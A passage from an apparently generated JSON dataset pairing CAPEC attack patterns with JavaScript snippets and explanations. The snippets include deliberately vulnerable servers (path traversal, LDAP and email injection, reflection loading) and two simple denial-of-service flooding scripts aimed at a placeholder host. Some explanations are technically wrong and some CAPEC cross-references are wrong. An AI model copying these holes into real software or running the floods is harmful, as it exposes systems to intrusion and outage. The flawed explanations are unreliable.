        "description": "This JavaScript code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function `vulnerableFunction` takes an input string and attempts to store its character codes into a fixed-size buffer of 10 elements. The loop iterates over the length of the input string, which can exceed the buffer's allocated size, leading to an out-of-bounds write. This can result in overwriting adjacent memory, potentially causing unexpected behavior or security vulnerabilities. The code embodies the main idea of the CAPEC by showing how improper handling of buffer boundaries can lead to memory corruption."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "const fs = require('fs');\nconst sharedFile = '/tmp/shared_resource.txt';\n\n// Thread 1: Writing to the shared resource\nsetTimeout(() => {\n  fs.writeFileSync(sharedFile, 'Thread 1 was here');\n  console.log('Thread 1 wrote to the file');\n}, 100);\n\n// Thread 2: Reading from the shared resource\nsetTimeout(() => {\n  const data = fs.readFileSync(sharedFile, 'utf8');\n  console.log('Thread 2 read from the file:', data);\n}, 200);\n\n// Thread 3: Writing to the shared resource\nsetTimeout(() => {\n  fs.writeFileSync(sharedFile, 'Thread 3 was here');\n  console.log('Thread 3 wrote to the file');\n}, 300);\n\n// Thread 4: Reading from the shared resource\nsetTimeout(() => {\n  const data = fs.readFileSync(sharedFile, 'utf8');\n  console.log('Thread 4 read from the file:', data);\n}, 400);",
        "description": "This JavaScript code snippet demonstrates a shared resource manipulation vulnerability. It uses the 'fs' module to simulate multiple threads (using setTimeout to mimic asynchronous behavior) accessing a shared file resource. Thread 1 and Thread 3 write to the shared file, while Thread 2 and Thread 4 read from it. The lack of proper synchronization (CWE-662) can lead to race conditions where the reads and writes interfere with each other, potentially causing data corruption or unexpected behavior. This example embodies the main idea of CAPEC-Shared Resource Manipulation by showing how improper handling of shared resources can lead to vulnerabilities."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/',\n  method: 'GET'\n};\n\nfunction floodServer() {\n  for (let i = 0; i < 10000; i++) { // CWE-770: No limit on the number of requests\n    const req = http.request(options, res => {\n      res.on('data', d => {});\n    });\n\n    req.on('error', error => {\n      console.error(error);\n    });\n\n    req.end();\n  }\n}\n\nfloodServer();",
        "description": "This JavaScript code snippet demonstrates a basic flooding attack against a target server. The `floodServer` function sends a large number of HTTP GET requests (10,000 in this case) to the target server without any rate limiting or throttling (CWE-770). This can lead to resource exhaustion on the target server, making it unavailable to legitimate users (CWE-400). The code does not handle resource shutdown or release properly (CWE-404), and it does not check if the resource pool is sufficient to handle the load (CWE-410). This example embodies the main idea of the CAPEC 'Flooding' attack by overwhelming the target with a high volume of requests in a short period."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const basePath = path.join(__dirname, 'restricted');\n  const requestedPath = path.join(basePath, req.url);\n\n  fs.readFile(requestedPath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'restricted' directory based on the URL requested by the client. The code constructs the file path by joining the base directory path with the requested URL path. However, it does not properly validate or sanitize the input path, making it vulnerable to path traversal attacks. An attacker could exploit this by sending requests with '../' sequences to access files outside the 'restricted' directory, potentially exposing sensitive files on the server."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n\n  fs.stat(filePath, (err, stats) => {\n    if (err) {\n      res.writeHead(404, { 'Content-Type': 'text/plain' });\n      res.end('Not Found');\n      return;\n    }\n\n    if (stats.isDirectory()) {\n      fs.readdir(filePath, (err, files) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(files.join('\\n'));\n      });\n    } else {\n      fs.readFile(filePath, (err, content) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(content);\n      });\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server processes incoming requests by checking if the requested path is a directory. If it is, the server lists the contents of the directory. If the path is a file, the server reads and returns the file's content. This code embodies the main idea of the CAPEC 'Directory Indexing' by potentially exposing directory contents to unauthorized users. The related CWEs are represented by the lack of proper authorization checks (CWE-285), improper protection of alternate paths (CWE-424), and incorrect permission assignments (CWE-732). This can lead to sensitive information disclosure and further exploitation by attackers."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "function processInput(input) {\n  let maxInt = 2147483647; // Maximum value for a 32-bit signed integer\n  let result = input + 1;\n\n  if (result > maxInt) {\n    console.log('Integer overflow detected!');\n    return;\n  }\n\n  console.log('Processed result:', result);\n}\n\nlet userInput = 2147483647; // Simulating user input\nprocessInput(userInput);",
        "description": "This JavaScript code snippet demonstrates an integer overflow vulnerability. The function `processInput` takes an integer input and adds 1 to it. If the input is the maximum value for a 32-bit signed integer (2147483647), adding 1 causes an integer overflow, resulting in an unexpected negative value. The code checks for overflow by comparing the result to the maximum integer value, but this check is performed after the overflow has already occurred, making it ineffective. This snippet embodies the main idea of CAPEC-Integer Attacks and highlights CWE-190 (Integer Overflow or Wraparound) and CWE-682 (Incorrect Calculation)."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  let buffer = new ArrayBuffer(8);\n  let view = new DataView(buffer);\n  let pointer = input;\n\n  // CWE-823: Use of Out-of-range Pointer Offset\n  if (pointer < 0 || pointer >= buffer.byteLength) {\n    console.log('Pointer out of range');\n    return;\n  }\n\n  // CWE-822: Untrusted Pointer Dereference\n  try {\n    let value = view.getInt32(pointer, true);\n    console.log('Value at pointer:', value);\n  } catch (e) {\n    console.log('Error dereferencing pointer:', e);\n  }\n}\n\n// Example usage\nvulnerableFunction(10); // Out of range\nvulnerableFunction(4);  // Valid range\nvulnerableFunction(-1); // Out of range",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that manipulates a pointer based on user input. The function `vulnerableFunction` takes an input value and uses it as a pointer to access an ArrayBuffer. The code checks if the pointer is within the valid range of the buffer (CWE-823: Use of Out-of-range Pointer Offset). If the pointer is out of range, it logs an error message. Otherwise, it attempts to dereference the pointer (CWE-822: Untrusted Pointer Dereference) and logs the value at the pointer location. This code embodies the main idea of the CAPEC by showing how an adversary could manipulate a pointer to access unintended memory locations, potentially leading to crashes or unauthorized data access."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "function allocateExcessiveMemory(size) {\n  let memory = [];\n  try {\n    for (let i = 0; i < size; i++) {\n      memory.push(new Array(1e6).fill('A'));\n    }\n  } catch (e) {\n    console.error('Memory allocation failed:', e);\n  }\n}\n\n// Example usage: allocateExcessiveMemory(1e6);",
        "description": "This JavaScript code snippet demonstrates an excessive memory allocation vulnerability. The function `allocateExcessiveMemory` takes a `size` parameter and attempts to allocate a large amount of memory by creating an array of arrays, each filled with a million 'A' characters. This can lead to uncontrolled resource consumption (CWE-400) and improper resource shutdown or release (CWE-404) if the memory is not properly managed. The code does not impose any limits on the size of the allocation (CWE-770), and it can easily exhaust the available memory, leading to a denial of service. This snippet embodies the main idea of the CAPEC by showing how a single request can cause excessive resource allocation, degrading or denying service to legitimate users."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "const http = require('http');\n\nlet connections = [];\n\nconst server = http.createServer((req, res) => {\n  // Simulate resource allocation\n  let resource = allocateResource();\n  connections.push(resource);\n\n  // Simulate processing request\n  setTimeout(() => {\n    res.end('Request processed');\n  }, 1000);\n\n  // Resource is not released properly\n  // Missing release of resource after effective lifetime (CWE-772)\n});\n\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});\n\nfunction allocateResource() {\n  // Simulate resource allocation\n  return { id: Math.random().toString(36).substr(2, 9) };\n}\n\n// Improper resource shutdown or release (CWE-404)\nprocess.on('SIGINT', () => {\n  console.log('Server shutting down...');\n  connections.forEach(resource => {\n    // Simulate improper release\n    console.log(`Resource ${resource.id} not properly released`);\n  });\n  process.exit();\n});",
        "description": "This JavaScript code snippet creates an HTTP server that simulates resource allocation for each incoming request. The allocated resources are stored in an array but are not properly released after their effective lifetime, embodying the concept of a resource leak (CWE-772). Additionally, when the server is shut down, it logs the resources that were not properly released, demonstrating improper resource shutdown or release (CWE-404). This code represents the main idea of the CAPEC 'Resource Leak Exposure' by showing how an adversary could deplete resources by exploiting improper resource management."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(filePath) {\n  try {\n    const resolvedPath = fs.realpathSync(filePath);\n    const data = fs.readFileSync(resolvedPath, 'utf8');\n    console.log(data);\n  } catch (err) {\n    console.error('Error reading file:', err);\n  }\n}\n\n// Example usage\nconst userInputPath = '/tmp/user_input.txt';\nreadFile(userInputPath);",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability to a symlink attack. The `readFile` function takes a file path as input, resolves the real path using `fs.realpathSync`, and then reads the file content using `fs.readFileSync`. If an attacker creates a symbolic link at `/tmp/user_input.txt` pointing to a sensitive file, the function will follow the symlink and read the unintended file. This embodies the main idea of the CAPEC by showing how improper link resolution and external control of file paths can lead to unauthorized file access."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "const args = process.argv.slice(2);\nconst knownOptions = ['--help', '--version'];\nconst hiddenOptions = ['--debug', '--admin'];\n\nargs.forEach(arg => {\n  if (knownOptions.includes(arg)) {\n    console.log(`Executing known option: ${arg}`);\n  } else if (hiddenOptions.includes(arg)) {\n    console.log(`Executing hidden option: ${arg}`);\n    if (arg === '--debug') {\n      console.log('Debugging information: Sensitive data exposed');\n    } else if (arg === '--admin') {\n      console.log('Admin mode activated: Elevated privileges granted');\n    }\n  } else {\n    console.log(`Unknown option: ${arg}`);\n  }\n});",
        "description": "This JavaScript code snippet simulates a scenario where an application processes command-line arguments. It defines a set of known options ('--help', '--version') and hidden options ('--debug', '--admin'). The code iterates over the provided arguments and checks if they match any known or hidden options. If a hidden option is detected, it executes functionality that reveals sensitive information or grants elevated privileges. This embodies the CAPEC 'Try All Common Switches' by demonstrating how an attacker might discover and exploit hidden functionality (CWE-912) and incomplete input validation (CWE-184). The code also highlights the risk of unchecked error conditions (CWE-391) and improper debug component handling (CWE-1296)."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "const http = require('http');\nconst querystring = require('querystring');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const postData = querystring.parse(body);\n      const email = postData.email;\n      const subject = postData.subject;\n      const message = postData.message;\n\n      // Vulnerable to Email Injection\n      const emailHeaders = `From: attacker@example.com\\r\\nTo: ${email}\\r\\nSubject: ${subject}\\r\\n\\r\\n${message}`;\n\n      // Simulate sending email (in reality, this would be sent to an email server)\n      console.log(emailHeaders);\n\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Email sent');\n    });\n  } else {\n    res.writeHead(405, {'Content-Type': 'text/plain'});\n    res.end('Method Not Allowed');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests. When a POST request is received, it parses the request body to extract email, subject, and message fields. It then constructs email headers using these fields without proper neutralization or escaping of special characters. This makes the code vulnerable to Email Injection attacks, where an attacker can manipulate the email headers by injecting CRLF sequences or other special characters. The code demonstrates the main idea of CAPEC-138 (Email Injection) and is related to several CWEs, including CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences), CWE-116 (Improper Encoding or Escaping of Output), and CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "const userInput = prompt('Enter your name:');\nconsole.log(userInput); // Vulnerable to format string injection\n",
        "description": "This JavaScript code snippet demonstrates a basic example of a format string injection vulnerability. The `prompt` function is used to capture user input, which is then directly passed to `console.log` without any validation or sanitization. If an attacker inputs a string containing format specifiers (e.g., `%s`, `%n`), it could lead to unexpected behavior or security issues. This snippet embodies the main idea of CAPEC-135 (Format String Injection) and highlights related CWEs such as CWE-134 (Use of Externally-Controlled Format String) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "const ldap = require('ldapjs');\n\nfunction authenticate(username, password) {\n  const client = ldap.createClient({ url: 'ldap://example.com' });\n  const base = 'dc=example,dc=com';\n  const filter = `(uid=${username})`;\n  const opts = { filter: filter, scope: 'sub' };\n\n  client.search(base, opts, (err, res) => {\n    if (err) {\n      console.error('LDAP search error:', err);\n      return;\n    }\n\n    res.on('searchEntry', (entry) => {\n      console.log('User found:', entry.object);\n      // Here you would typically check the password\n    });\n\n    res.on('error', (err) => {\n      console.error('LDAP search error:', err);\n    });\n\n    res.on('end', (result) => {\n      console.log('LDAP search completed with status:', result.status);\n    });\n  });\n}\n\nauthenticate('*', 'password');",
        "description": "This JavaScript code snippet demonstrates a vulnerable LDAP query that is susceptible to LDAP Injection. The `authenticate` function takes a `username` and `password` as input and constructs an LDAP query using the `username` directly in the filter without proper sanitization. This allows an attacker to manipulate the `username` input to inject special characters or commands, such as using `*` to retrieve information about all users in the LDAP directory. The code highlights the importance of proper input validation and neutralization to prevent LDAP Injection attacks."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const query = require('url').parse(req.url, true).query;\n  const userInput = query.userInput;\n  const sensitiveData = 'secret';\n\n  // Vulnerable code: directly using user input in a GET request\n  const url = `http://example.com/api?data=${userInput}&sensitive=${sensitiveData}`;\n\n  http.get(url, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error: ' + err.message);\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming GET requests. It extracts a user-provided input from the query parameters and uses it directly in constructing another GET request to an external API. This demonstrates the vulnerability described in the CAPEC by allowing an attacker to manipulate the query string. For example, if the user input is 'myInput&new_param=myValue', it will alter the intended request by adding a new parameter. The code also includes sensitive data in the query string, which is a security risk (CWE-598). The lack of proper encoding or escaping of the user input (CWE-116) and improper neutralization of special elements (CWE-77) further exacerbate the vulnerability."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const query = new URL(req.url, `http://${req.headers.host}`).searchParams;\n  const className = query.get('class');\n  const methodName = query.get('method');\n\n  try {\n    const ClassRef = require(`./${className}`);\n    const instance = new ClassRef();\n    const result = instance[methodName]();\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(result);\n  } catch (error) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error: ' + error.message);\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that uses reflection to dynamically load and invoke methods from classes based on user input. The server reads the 'class' and 'method' parameters from the URL query string, then attempts to load the specified class and invoke the specified method. This embodies the main idea of CAPEC-470 (Reflection Injection) and related CWEs, as it allows an adversary to control the input used in reflection, potentially leading to the execution of unintended or malicious code. The code does not validate or sanitize the input, making it vulnerable to various injection attacks, such as command injection (CWE-77) and code injection (CWE-94)."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  let filePath = path.join(__dirname, 'public', req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('404 Not Found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.write(data);\n      res.end();\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory based on the URL requested by the client. The main vulnerability here is that the 'filePath' is constructed using 'path.join' with 'req.url' directly, without proper validation or sanitization. This allows an attacker to perform a relative path traversal attack by including sequences like '../' in the URL, potentially accessing files outside the 'public' directory. This embodies the main idea of CAPEC-126 (Relative Path Traversal) and related CWEs, where improper input validation allows unauthorized access to arbitrary files."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "const forms = ['form1', 'form2', 'form3'];\nlet currentFormIndex = 0;\n\nfunction navigateToForm(formName) {\n  const formIndex = forms.indexOf(formName);\n  if (formIndex === -1 || formIndex > currentFormIndex) {\n    console.error('Unauthorized form access');\n    return;\n  }\n  currentFormIndex = formIndex;\n  console.log(`Navigated to ${formName}`);\n}\n\n// Simulate user navigating to forms\nnavigateToForm('form1'); // Valid\nnavigateToForm('form3'); // Invalid, should be 'form2' first\nnavigateToForm('form2'); // Valid\nnavigateToForm('form3'); // Now valid",
        "description": "This JavaScript code snippet simulates a sequence of web forms that a user must navigate through in order. The `forms` array holds the names of the forms in the required sequence. The `currentFormIndex` variable keeps track of the user's current position in the sequence. The `navigateToForm` function checks if the user is trying to access a form out of sequence. If the user tries to skip forms (e.g., going directly to 'form3' from 'form1'), an error is logged, and the navigation is blocked. This code embodies the main idea of CAPEC- bypassing intermediate forms in a sequence, and it also highlights related CWEs such as incomplete internal state distinction (CWE-372) and reliance on untrusted inputs (CWE-807)."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "const cache = {}; // Simple in-memory cache\n\nfunction fetchData(url) {\n  if (cache[url]) {\n    return cache[url]; // Return cached data if available\n  }\n\n  // Simulate fetching data from a less trusted source\n  const data = fetchFromUntrustedSource(url);\n  cache[url] = data; // Cache the fetched data\n  return data;\n}\n\nfunction fetchFromUntrustedSource(url) {\n  // Simulate fetching data from an untrusted source\n  return 'untrusted data';\n}\n\n// Example usage\nconst data = fetchData('http://example.com');\nconsole.log(data);",
        "description": "This JavaScript code snippet demonstrates a simple in-memory cache mechanism that fetches data from a less trusted source and caches it without proper verification. The `fetchData` function first checks if the requested URL's data is already in the cache. If it is, it returns the cached data. If not, it fetches the data from an untrusted source using the `fetchFromUntrustedSource` function and caches it. This code embodies the main idea of the CAPEC 'Cache Poisoning' by showing how an attacker could exploit the cache to store incorrect or harmful data. The related CWEs are represented as follows: CWE-348 (Use of Less Trusted Source) is shown by fetching data from an untrusted source, CWE-345 (Insufficient Verification of Data Authenticity) is demonstrated by not verifying the authenticity of the fetched data, and CWE-349 (Acceptance of Extraneous Untrusted Data With Trusted Data) is implied by treating the untrusted data as if it were trusted once cached."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "const dns = require('dns');\n\nfunction resolveDomain(domain) {\n  dns.resolve4(domain, (err, addresses) => {\n    if (err) throw err;\n    console.log(`IP addresses for ${domain}: ${addresses}`);\n    addresses.forEach((ip) => {\n      dns.reverse(ip, (err, hostnames) => {\n        if (err) throw err;\n        console.log(`Reverse for ${ip}: ${hostnames}`);\n        // Security-critical action based on reverse DNS resolution\n        if (hostnames.includes(domain)) {\n          console.log(`Performing security-critical action for ${domain}`);\n        } else {\n          console.log(`Warning: ${ip} does not resolve back to ${domain}`);\n        }\n      });\n    });\n  });\n}\n\nresolveDomain('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS resolution process that is vulnerable to DNS cache poisoning. The code resolves the IP addresses for a given domain and then performs a reverse DNS lookup to verify the hostnames associated with those IP addresses. A security-critical action is taken based on the reverse DNS resolution. However, this process is vulnerable to DNS cache poisoning because it does not sufficiently verify the authenticity of the DNS data (CWE-345), relies on reverse DNS resolution for a security-critical action (CWE-350), and does not properly validate the origin of the data (CWE-346). An attacker could manipulate the DNS cache to return incorrect IP addresses, leading the application to make incorrect security decisions."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('404 Not Found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://localhost:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads and serves files based on the URL requested by the client. The code does not implement any access control mechanisms, meaning any file under the web root directory can be accessed if its path is known. This embodies the main idea of the CAPEC 'Detect Unpublicized Web Pages' by allowing an adversary to access unpublicized web pages or files. The code also touches on related CWEs: CWE-425 (Direct Request), CWE-219 (Storage of File with Sensitive Data Under Web Root), and CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere) by not restricting access to sensitive files or directories."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Unpublicized web service\napp.get('/admin/secret', (req, res) => {\n  res.send('This is a secret admin page.');\n});\n\n// Public web service\napp.get('/public', (req, res) => {\n  res.send('This is a public page.');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with two endpoints: one public and one unpublicized. The '/admin/secret' endpoint represents an unpublicized web service that could be discovered by an adversary through forced browsing (CWE-425). The '/public' endpoint is a regular public service. The unpublicized endpoint does not have any authorization checks, making it vulnerable to unauthorized access. This example highlights the risk of having unpublicized web services without adequate security controls, as described in the CAPEC. Additionally, it touches on CWE-223 by not logging access to the secret endpoint, making it harder to detect unauthorized access."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "const crypto = require('crypto');\n\nfunction calculateChecksum(message) {\n  return crypto.createHash('md5').update(message).digest('hex');\n}\n\nfunction sendMessage(message) {\n  const checksum = calculateChecksum(message);\n  // Simulate sending message and checksum\n  return { message, checksum };\n}\n\nfunction receiveMessage(packet) {\n  const { message, checksum } = packet;\n  const calculatedChecksum = calculateChecksum(message);\n  if (calculatedChecksum !== checksum) {\n    console.log('Message integrity check failed!');\n  } else {\n    console.log('Message received successfully.');\n  }\n}\n\n// Simulate an attacker modifying the message and checksum\nconst originalPacket = sendMessage('Hello, World!');\nconst tamperedPacket = { message: 'Hello, Hacker!', checksum: calculateChecksum('Hello, Hacker!') };\n\n// Receiver checks the integrity of the original and tampered messages\nreceiveMessage(originalPacket); // Should pass\nreceiveMessage(tamperedPacket); // Should fail but will pass due to checksum spoofing",
        "description": "This JavaScript code snippet demonstrates a basic example of checksum spoofing. The `calculateChecksum` function uses the MD5 hash algorithm to generate a checksum for a given message. The `sendMessage` function simulates sending a message along with its checksum. The `receiveMessage` function checks the integrity of the received message by recalculating the checksum and comparing it with the received checksum. The code then simulates an attacker modifying both the message and its checksum, demonstrating how the integrity check can be bypassed if the checksum is spoofed. This example highlights the vulnerabilities described in the CAPEC and related CWEs, such as the use of a weak hash function (MD5) and improper validation of integrity check values."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-schema', (req, res) => {\n  const schemaPath = './schemas/userSchema.xsd';\n  const newSchema = req.body.schema;\n\n  // CWE-15: External Control of System or Configuration Setting\n  fs.writeFile(schemaPath, newSchema, (err) => {\n    if (err) {\n      return res.status(500).send('Error saving schema');\n    }\n    res.send('Schema updated successfully');\n  });\n});\n\napp.post('/validate-xml', (req, res) => {\n  const xmlData = req.body.xml;\n  const schemaPath = './schemas/userSchema.xsd';\n\n  // CWE-112: Missing XML Validation\n  // CWE-91: XML Injection\n  // CWE-643: Improper Neutralization of Data within XPath Expressions\n  const isValid = validateXML(xmlData, schemaPath);\n\n  if (isValid) {\n    res.send('XML is valid');\n  } else {\n    res.status(400).send('Invalid XML');\n  }\n});\n\nfunction validateXML(xml, schemaPath) {\n  // Placeholder function for XML validation\n  // Insecure: Does not actually validate XML against the schema\n  return true;\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web server using Express.js that allows users to upload and update an XML schema, and then validate XML data against this schema. The code embodies the concept of XML Schema Poisoning by allowing external control over the XML schema (CWE-15). The schema is updated without proper validation, which can lead to security issues (CWE-112). The XML validation function is a placeholder and does not perform actual validation, making it susceptible to XML Injection (CWE-91) and XPath Injection (CWE-643). This represents the main idea of CAPEC-XML Schema Poisoning, where an adversary can manipulate the schema to compromise the system."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "const http = require('http');\nconst xmlMessage = '<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Body><m:GetStockPrice xmlns:m=\"http://www.example.org/stock\"><m:StockName>IBM</m:StockName></m:GetStockPrice></soap:Body></soap:Envelope>';\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/soap-endpoint',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/soap+xml',\n    'Content-Length': Buffer.byteLength(xmlMessage)\n  }\n};\n\nfunction sendRequest() {\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  });\n\n  req.on('error', (e) => {});\n  req.write(xmlMessage);\n  req.end();\n}\n\nsetInterval(sendRequest, 10);",
        "description": "This JavaScript code snippet demonstrates a basic implementation of an XML Ping of the Death attack. It repeatedly sends a SOAP XML message to a target server at a rapid rate, aiming to deplete the server's resources and potentially cause a denial of service. The code leverages the 'http' module to create and send HTTP POST requests containing the SOAP XML message. The setInterval function is used to continuously send these requests every 10 milliseconds. This attack exploits several weaknesses, including uncontrolled resource consumption (CWE-400), allocation of resources without limits (CWE-770), and missing XML validation (CWE-112)."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const targetUrl = queryObject.url;\n\n  if (!targetUrl) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request: URL parameter is missing');\n    return;\n  }\n\n  http.get(targetUrl, (response) => {\n    let data = '';\n\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    response.on('end', () => {\n      // Vulnerable to content spoofing\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Internal Server Error');\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that fetches content from a URL specified in the query parameters and serves it to the client. The code is vulnerable to content spoofing (CAPEC-139) because it does not verify the authenticity or integrity of the fetched content (CWE-345, CWE-924). An attacker could manipulate the URL parameter to serve malicious content, leading to potential malware exposure or financial fraud. Additionally, the server does not correctly specify the intended destination (CWE-941) and does not enforce message integrity during transmission (CWE-924)."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction createTempFile(data) {\n  const tempDir = '/tmp';\n  const tempFileName = `tempfile_${Date.now()}.txt`;\n  const tempFilePath = path.join(tempDir, tempFileName);\n\n  fs.writeFileSync(tempFilePath, data, { mode: 0o666 });\n  return tempFilePath;\n}\n\nconst userData = 'Sensitive information';\nconst tempFilePath = createTempFile(userData);\nconsole.log(`Temporary file created at: ${tempFilePath}`);",
        "description": "This JavaScript code snippet demonstrates the creation of a temporary file with predictable naming and insecure permissions, embodying the main idea of the CAPEC 'Explore for Predictable Temporary File Names'. The function `createTempFile` generates a temporary file in the '/tmp' directory with a name based on the current timestamp, which is predictable. The file is created with insecure permissions (mode 0o666), allowing read and write access to all users. This setup can be exploited by an attacker to predict the file name and location, potentially leading to further attacks such as information gathering or symlink attacks. The code highlights vulnerabilities related to CWE-377, CWE-378, and CWE-379."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
